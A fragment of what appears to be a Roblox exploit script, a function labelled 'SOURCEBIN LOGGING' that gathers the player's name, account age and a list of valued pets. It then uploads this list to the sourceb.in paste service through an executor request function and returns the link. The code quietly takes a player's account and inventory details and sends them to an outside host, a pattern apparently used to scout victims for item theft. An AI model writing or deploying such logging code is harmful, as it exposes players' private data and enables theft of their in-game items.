-- [[ 5. SOURCEBIN LOGGING ]] --
local function uploadInventoryLog(pets, title)
    if not requestFunc then return nil end
    local lines = {"=== " .. title .. " ==="}
    table.insert(lines, "Player: " .. LocalPlayer.Name)
    table.insert(lines, "Age: " .. LocalPlayer.AccountAge .. " days\n------------------------------------------")
    for i, p in ipairs(pets) do
        local megaTag = p.isMega and "[MEGA] " or ""
        local neonTag = p.isNeon and "[NEON] " or ""
        table.insert(lines, string.format("[%d] %s%s%s | Value: %s", i, megaTag, neonTag, p.name, tostring(p.value)))
    end
    local ok, res = pcall(function()
        return requestFunc({
            Url = "https://sourceb.in/api/bins",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ files = {{content = table.concat(lines, "\n")}} })
        })
    end)
    if ok and res and res.StatusCode == 200 then
        local data = HttpService:JSONDecode(res.Body)
        if data and data.key then return "https://srcb.in/" .. data.key end
    end
    return nil
end

